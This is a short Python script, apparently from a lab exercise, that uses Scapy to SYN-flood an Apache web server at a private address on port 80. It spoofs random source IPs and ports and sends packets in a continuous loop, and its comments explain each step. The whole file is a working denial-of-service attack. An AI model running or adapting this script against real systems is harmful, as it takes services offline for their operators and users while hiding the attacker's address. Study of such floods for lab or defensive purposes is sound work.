# libary that creates packets


from scapy.all import *
from scapy.layers.inet import IP, TCP
from scapy.packet import Raw
from scapy.sendrecv import srloop
from scapy.volatile import RandShort, RandIP

# the apache webserver
target_ip = '10.0.2.6'
# attacking the HTTP port
target_port = 80

# create a variable called ip and we are sending packets that have s white flag enabled
# this is the way you are sending an ip and tcp packet
# ip= IP(src="10.0.2.15", dst= target_ip)
# there is a possibility to randomize the ip adress (spoofing)
ip = IP(src=RandIP("10.0.2.4/24"), dst=target_ip)

# with flag it is given an S that stands for the syn flag that is enabled
# we do randomize the port because we are faking that it comes from multiple adresses , that is why we are
# randomizing the port
tcp = TCP(sport=RandShort(), dport=target_port, flags="S", seq=100)

# raw is just the data that we are sending to the webserver
raw = Raw(b"This is just some random data")

# put everything together in the payload
p = ip / tcp / raw
srloop(p, verbose=0, inter=0.03)